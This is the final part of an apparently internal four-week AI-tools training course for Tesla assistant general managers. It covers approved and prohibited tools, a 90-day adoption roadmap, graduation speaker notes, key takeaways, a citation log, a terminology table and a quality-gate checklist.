- Bottle Rocket (go.tesla.com/chat)
- IT Assist
- Employee Assist
- Power Automate (runs within Microsoft 365)

**Conditional (NO Tesla Data):**
- GitHub Copilot

**Prohibited:**
- ChatGPT
- Claude.ai
- Meeting transcription tools
- Apple Intelligence

> **From Research:** "GitHub Copilot cannot be used with Tesla data. Use Bottle Rocket for Tesla data analysis and Power Automate for Tesla data workflows."
> **Source:** research.md, Tesla AI Policy Compliance

### Common Mistakes

⚠️ **Mistake 1:** Stopping AI usage after the course ends
- Why it happens: No external pressure to continue; old habits return
- How to avoid: Commit to one AI task per day for 30 days; track it on a checklist
- **Source:** research.md, Productivity Optimization - Habit Formation

⚠️ **Mistake 2:** Trying to teach everything at once
- Why it happens: Enthusiasm after completing the course
- How to avoid: Start with one use case, one person, one week at a time
- **Source:** research.md, Common Pitfalls (Training Best Practice)

⚠️ **Mistake 3:** Not updating project memory as the operation evolves
- Why it happens: Set-and-forget mentality
- How to avoid: Schedule a monthly 10-minute review of copilot-instructions.md
- **Source:** research.md, Advanced Agent Capabilities - Maintenance

### Speaker Notes

```
TIMING: 15 minutes

SAY: "The course is ending, but your AI journey is just beginning. Let's talk about what happens next."

SHOW: 90-Day Roadmap (display on projector)

SAY: "I have laid out a 90-day plan. Days 1 through 30, build the habit. Days 31 through 60, expand your skills. Days 61 through 90, multiply the impact by teaching your team."

SAY: "The single most important thing is daily usage. Research shows that consistent users get 3x the productivity gains compared to occasional users. Use AI for at least one task every single day for the next 30 days."

ASK: "What is the one task you will commit to doing with AI every day starting tomorrow?" [Go around the room]

SAY: "Write that down. That is your commitment."

SHOW: Teaching Your Team section

SAY: "The second most important thing is sharing what you have learned. Teach one lead your best prompt this week. Run a 15-minute 'AI tip of the week' at shift start. Create a shared prompt library."

SAY: "You do not need to teach everything at once. Start with Bottle Rocket and the prompt formula. That is enough to get anyone started."

ASK: "Who is the first person on your team you will teach? What will you show them?"

SHOW: Resources list

SAY: "These resources are in your course materials. The AI Policy at go.tesla.com/aitools is your source of truth for what is approved. Check it monthly — the list evolves."

SAY: "And remember to update your copilot-instructions.md file monthly. As your operation changes, your AI assistant should change with it."

TRANSITION: "Now let's wrap this up properly. You have earned it."
```

---

## Section 14: Course Graduation and Next Steps

**Duration:** 10 minutes
**Objective:** Celebrate course completion, reinforce key learnings, and set expectations for post-course follow-up

### Key Concept

Four weeks ago, you had zero experience with AI tools. Today you can write effective prompts, use advanced techniques like Chain-of-Thought, operate Agent Mode, build Power Automate flows, configure project memory, evaluate AI outputs, and build real automations that save time every day. That is a remarkable transformation.

### Course Time Savings Summary

| Week | Skills | Potential Daily Savings |
|------|--------|------------------------|
| 1 | Prompt formula, Bottle Rocket basics | 15-20 min |
| 2 | Advanced prompting, templates, Power Automate intro | 20-30 min |
| 3 | Voice Mode, Agent Mode | 30-40 min |
| 4 | Power Automate flows, Memory, Multi-Agent, Security | 40-60 min |
| **Total** | **Complete AI toolkit** | **40-60 min/day** |

That is 3-5 hours per week. Over 150 hours per year. Per person.

> **From Research:** "Daily time savings with AI: 40-60 minutes. Workflow automation time reduction: 60-95% on routine tasks."
> **Source:** research.md, Productivity Statistics

### Your Complete Toolkit

| Tool | Use For | Learned |
|------|---------|---------|
| Bottle Rocket | Any Tesla data task | Week 1 |
| Prompt Formula (ROLE+CONTEXT+TASK+FORMAT) | Structured AI requests | Week 1 |
| Chain-of-Thought prompting | Complex reasoning | Week 2 |
| Few-Shot prompting | Consistent formatting | Week 2 |
| Prompt templates | Recurring tasks | Week 2 |
| Power Automate (intro) | Workflow automation basics | Week 2 |
| Voice Mode | Hands-free AI | Week 3 |
| Agent Mode | Multi-step automation | Week 3 |
| Power Automate Desktop | RPA for legacy systems | Week 4 |
| Power Automate Cloud | Scheduled and triggered workflows | Week 4 |
| Project Memory | Persistent context | Week 4 |
| Quality Scorecard | Output evaluation | Week 4 |
| Security Review | Safe AI usage | Week 4 |

### The Four Principles That Never Change

No matter how AI tools evolve, these principles remain constant:

1. **Clear prompts produce clear outputs.** The prompt formula works with any AI tool.
2. **Human review is non-negotiable.** Your judgment makes AI outputs trustworthy.
3. **Policy compliance protects everyone.** Tesla data stays in approved tools.
4. **Practice compounds over time.** Daily usage beats occasional expertise.

### Post-Course Follow-Up

| Timeline | Action | Owner |
|----------|--------|-------|
| Week 1 after course | Start daily AI usage habit | Each AGM |
| Week 2 after course | Teach one lead your best prompt | Each AGM |
| Month 1 check-in | Share time savings data | Facilitator + AGMs |
| Month 2 check-in | Review roadmap progress | Facilitator + AGMs |
| Month 3 review | Assess ROI, plan next steps | Leadership |

### Final Activity: One-Word Reflection

Go around the room. One word that describes your four-week AI journey.

### Speaker Notes

```
TIMING: 10 minutes

SAY: "Four weeks ago, you walked in here with zero AI experience. Look at what you can do now."

SHOW: Complete Toolkit table

SAY: "Prompt formula, advanced techniques, voice mode, Agent Mode, Power Automate, project memory, quality evaluation, security review. You have a complete toolkit. And you have proven you can build real automations that save real time."

SHOW: Time Savings Summary

SAY: "40 to 60 minutes per day. Over 150 hours per year. That is not theoretical — you have already started saving that time."

SAY: "Four principles that will never change, no matter what new tools come along:"
1. "Clear prompts produce clear outputs."
2. "Human review is non-negotiable."
3. "Policy compliance protects everyone."
4. "Practice compounds over time."

SAY: "These principles worked for Bottle Rocket, they work for Agent Mode, and they will work for whatever AI tool comes next year."

ACTIVITY: One-word reflection
SAY: "Let's go around the room. One word that describes your four-week AI journey."
[Go around — expect words like: empowering, surprising, practical, game-changing, eye-opening]

CELEBRATE: "Give yourselves a round of applause. You earned it."

SAY: "Your follow-up actions: start using AI daily, teach one lead this week, and update your copilot-instructions.md as your operation evolves."

SAY: "I will check in at month 1 and month 2 to hear about your progress. Share your time savings data — it helps make the case for expanding this training."

CLOSING: "Thank you for your engagement, your curiosity, and your willingness to learn something completely new. AI tools will keep evolving, but the foundation you have built — clear prompts, human review, policy compliance — those will serve you no matter what comes next."

SAY: "Go save some time. Class dismissed."
```

---

## Key Takeaways

1. **Power Automate runs workflows automatically** — Desktop flows for RPA, cloud flows for scheduled tasks, process flows for approvals. Fully approved for Tesla data. *Source: Microsoft Power Automate Documentation*

2. **Project memory eliminates the warm-up period** — copilot-instructions.md gives the agent permanent context about your operation. *Source: research.md, Advanced Agent Capabilities*

3. **Multi-agent patterns coordinate complex tasks** — Sequential, Parallel, Supervisor, Human-in-Loop patterns. *Source: research.md, Multi-Agent Orchestration*

4. **Quality scorecard keeps outputs reliable** — Accuracy, completeness, format, speed, usability. *Source: research.md, Evaluation and Optimization*

5. **The Three Nevers keep you secure** — Never auto-approve, never skip review, never share secrets. *Source: research.md, Security Best Practices*

6. **76% of enterprises use human review** — Always verify AI outputs before using. *Source: research.md, Productivity Statistics*

7. **40-60 minutes daily savings** — Cumulative impact of AI tools on routine tasks. *Source: research.md, Productivity Statistics*

8. **80/20 rule** — 80% of your time savings come from 20% of your prompts. Optimize those. *Source: research.md, Productivity Optimization*

9. **Policy always applies** — Bottle Rocket and Power Automate for Tesla data; GitHub Copilot for non-Tesla only. *Source: research.md, Tesla AI Policy*

10. **Practice compounds** — Daily usage beats occasional expertise by 3x. *Source: research.md, Productivity Statistics*

---

## Research Citation Log

| Section | Citations | Source Sections Referenced |
|---------|-----------|---------------------------|
| Section 1: Time Savings Review + ROI | 3 | Productivity Statistics |
| Section 2: Power Automate — Workflow Automation | 5 | Microsoft Power Automate Docs, Tesla IT Policy, Security Best Practices |
| Section 3: Exercise 1 — Power Automate Desktop + Cloud | 3 | Power Automate ROI, Best Practices, Desktop Documentation |
| Section 4: Agents That Remember | 4 | Advanced Agent Capabilities, Multimodal Processing, Security |
| Section 5: Break | 0 | N/A |
| Section 6: Exercise 2 — Persistent DC Assistant | 1 | Advanced Agent Capabilities |
| Section 7: Multi-Agent Orchestration | 5 | Multi-Agent Orchestration, Risk Awareness |
| Section 8: Exercise 3 — Dive Deep Automation | 4 | Real-World Applications, Agent Mode, Productivity |
| Section 9: Break | 0 | N/A |
| Section 10: Evaluating & Optimizing | 4 | Evaluation and Optimization, Productivity Optimization |
| Section 11: Security Review Basics | 3 | Security Best Practices, Tesla AI Policy, Power Automate Security |
| Section 12: Exercise 4 — Project Showcase | 1 | Productivity Statistics |
| Section 13: Continuous Learning Roadmap | 4 | Timeline, Tesla AI Policy, Productivity, Optimization |
| Section 14: Course Graduation | 1 | Productivity Statistics |
| **Total** | **38** | |

---

## Terminology Introduced

| Term | Definition | First Used |
|------|------------|------------|
| Power Automate | Microsoft's workflow automation platform with desktop, cloud, and process flows | Week 2 (intro), Week 4 (advanced) |
| Desktop Flow | Power Automate flow that automates mouse/keyboard actions (RPA) | Week 4 |
| Cloud Flow | Power Automate flow triggered by schedule, event, or data change | Week 4 |
| Process Flow | Power Automate flow for multi-step approval chains with branching | Week 4 |
| RPA (Robotic Process Automation) | Automating repetitive tasks by simulating human interactions | Week 4 |
| Connection Reference | Secure credential storage in Power Automate (vs. hardcoded passwords) | Week 4 |
| Multi-Agent Orchestration | Coordinating multiple AI agents for complex tasks | Week 4 |
| Sequential Pattern | Orchestration where agents run in series (A then B then C) | Week 4 |
| Parallel Pattern | Orchestration where agents run simultaneously | Week 4 |
| Supervisor Pattern | Orchestration where main agent delegates to specialists | Week 4 |
| Human-in-Loop | Orchestration pattern with human approval at key steps | Week 4 |
| Project Memory | Persistent context files that agents read automatically across conversations | Week 4 |
| copilot-instructions.md | GitHub Copilot's project memory file located in .github/ folder | Week 4 |
| Quality Scorecard | Five-dimension evaluation framework: accuracy, completeness, format, speed, usability | Week 4 |
| Decision Framework | Structured approach for choosing the right AI tool/technique for each task type | Week 4 |
| Context Window Budget | The token limit that determines how much context an AI can process at once | Week 4 |
| Multimodal Input | Providing multiple types of data (text + images) to an AI agent simultaneously | Week 4 |
| The Three Nevers | Security rules: never auto-approve, never skip review, never share secrets | Week 4 |
| Agent Mode | GitHub Copilot mode for autonomous task execution | Week 3 (continued) |
| Voice Mode | Hands-free AI interaction via speech | Week 3 (continued) |
| Prompt Formula | ROLE + CONTEXT + TASK + FORMAT | Week 1 (continued) |

---

## Sources Used

All content derived from:
- `outputs/week-4/research.md` — 38 citations
- `outputs/syllabus.md` — objectives and structure
- Microsoft Power Automate documentation — workflow automation content (Sections 2, 3)
- Interview Kickstart Agentic AI curriculum — adapted for non-technical AGMs (Sections 4, 8)

---

## Quality Gate Checklist

| Check | Requirement | Status |
|-------|-------------|--------|
| Research citations | 3+ per major section | 38 total, 3+ per lecture section |
| Speaker notes | Present for all sections | All 14 sections covered |
| Examples | All from research or clearly attributed | All sourced |
| Statistics | All cited from research | All cited |
| Terminology | Consistent with previous weeks | Verified; Power Automate terms added |
| Time estimates | Total = 240 minutes | 240 minutes (15+15+25+20+10+25+15+25+10+20+15+25+15+5) |
| Learning objectives | 8 total (4 existing + 4 new) | 8 objectives listed |
| Exercises | 4 hands-on exercises | Ex1 Power Automate, Ex2 Memory, Ex3 Dive Deep, Ex4 Showcase |
| Breaks | 2 breaks (10 min each) | Breaks at 1:15 and 2:30 |
| New sections | Power Automate, Memory, Evaluation, Security, Showcase | Sections 2, 4, 10, 11, 12 |
| Citation log | Complete and accurate | Complete with 38 citations |
| Terminology table | All new terms included | Power Automate terms added per requirements |

---

*Content created: January 2026*
*Content expanded: February 2026*
*MCP replaced with Power Automate: February 2026*
*Session Duration: 240 minutes*
*Primary Source: outputs/week-4/research.md, Microsoft Power Automate Documentation*
